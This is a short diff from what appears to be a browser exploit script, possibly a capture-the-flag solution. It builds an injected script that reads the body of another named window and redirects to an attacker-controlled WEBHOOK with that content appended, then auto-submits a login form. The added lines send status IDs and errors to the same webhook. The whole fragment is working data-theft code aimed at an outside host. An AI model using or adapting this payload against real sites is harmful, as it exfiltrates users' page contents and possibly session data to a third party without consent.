@@ -30,6 +30,8 @@ const content = window.open('', 'first').document.body.innerHTML;
 window.location = "${WEBHOOK}?" + content;
 </script>`;
     document.getElementById("login").submit();
+  } else {
+    post(WEBHOOK, `ID was ${id}`);
   }
 } catch (error) {
   post(WEBHOOK, `Error ${id}: ${error}`);
